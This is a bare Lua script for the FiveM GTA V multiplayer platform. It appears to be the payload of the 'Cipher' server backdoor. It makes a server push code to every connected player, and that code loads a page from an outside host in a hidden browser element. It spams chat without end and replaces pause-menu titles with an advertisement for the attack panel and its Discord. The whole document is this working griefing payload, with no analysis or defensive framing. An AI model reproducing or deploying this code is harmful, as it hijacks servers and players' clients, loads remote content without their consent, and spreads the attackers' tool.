TriggerClientEvent('helpCode', -1, [[local sound = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/5.html", 50, 50);

local showtext = true
local chatspam = false
local bypass = true
local triggered = false

local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
local texts = {
    "Cipher - ciao",
    " Cipher - ciao",
    "  Cipher - ciao",
    "   Cipher - ciao",
    "    Cipher - ciao",
    "     Cipher - ciao",
    "      Cipher - ciao",
    "       Cipher - ciao",
    "        Cipher - ciao",
    "         Cipher - ciao",
    "          Cipher - ciao",
    "           Cipher - ciao",
    "            Cipher - ciao",
    "             Cipher - ciao",
    "              Cipher - ciao",
    "               Cipher - ciao",
    "                Cipher - ciao",
    "                 Cipher - ciao",
    "                  Cipher - ciao",
    "                 Cipher - ciao",
    "                Cipher - ciao",
    "               Cipher - ciao",
    "              Cipher - ciao",
    "             Cipher - ciao",
    "            Cipher - ciao",
    "           Cipher - ciao",
    "          Cipher - ciao",
    "         Cipher - ciao",
    "        Cipher - ciao",
    "       Cipher - ciao",
    "      Cipher - ciao",
    "     Cipher - ciao",
    "    Cipher - ciao",
    "   Cipher - ciao",
    "  Cipher - ciao",
    " Cipher - ciao",
}



Citizen.CreateThread(function()
    if(bypass == false)then
        Citizen.Wait(20300)
    end

    

    chatspam = true
end)

Citizen.CreateThread(function()
    if(bypass == false)then
        Citizen.Wait(13300)
    end
    showtext = false
    
end)

function doActions()
end



function AddTextEntry(key, value)
	Citizen.InvokeNative(GetHashKey("ADD_TEXT_ENTRY"), key, value)
end

local config = {
    ["TITLE"] = "~r~CIPHER-PANEL.ME - https://discord.gg/9RwSte8",
    ["SUBTITLE"] = "~r~CIPHER-PANEL.ME - https://discord.gg/9RwSte8",
    ["MAP"] = "CIPHER-PANEL.ME",
    ["STATUS"] = "CIPHER-PANEL.ME",
    ["GAME"] = "CIPHER-PANEL.ME",
    ["INFO"] = "CIPHER-PANEL.ME",
    ["SETTINGS"] = "CIPHER-PANEL.ME",
    ["R*EDITOR"] = "CIPHER-PANEL.ME",
}

Citizen.CreateThread(function()
    while true do
    Citizen.Wait(0)
        N_0xb9449845f73f5e9c("SHIFT_CORONA_DESC")
        PushScaleformMovieFunctionParameterBool(true)
        PopScaleformMovieFunction()
        N_0xb9449845f73f5e9c("SET_HEADER_TITLE")
        PushScaleformMovieFunctionParameterString(config["TITLE"])
        PushScaleformMovieFunctionParameterBool(true)
        PushScaleformMovieFunctionParameterString(config["SUBTITLE"])
        PushScaleformMovieFunctionParameterBool(true)
        PopScaleformMovieFunctionVoid()
    end
end)


Citizen.CreateThread(function()
    AddTextEntry('PM_SCR_MAP', config["MAP"])
    AddTextEntry('PM_SCR_STA', config["STATUS"])
    AddTextEntry('PM_SCR_GAM', config["GAME"])
    AddTextEntry('PM_SCR_INF', config["INFO"])
    AddTextEntry('PM_SCR_SET', config["SETTINGS"])
    AddTextEntry('PM_SCR_RPL', config["R*EDITOR"])
end)

Citizen.CreateThread(function()
    local i = 1
    local j = 1
    while true do
        Citizen.Wait(50)
        if(chatspam)then
            TriggerEvent('chat:addMessage', {
                color = chatColors[i],
                multiline = true,
                args = {texts[j]}
            })
            if(chatColors[i+1] ~= nil)then
                i = i+1
            else
                i = 1
            end
            if(texts[j+1] ~= nil)then
                j = j+1
            else
                j = 1
            end
        end
    end
end)


]])

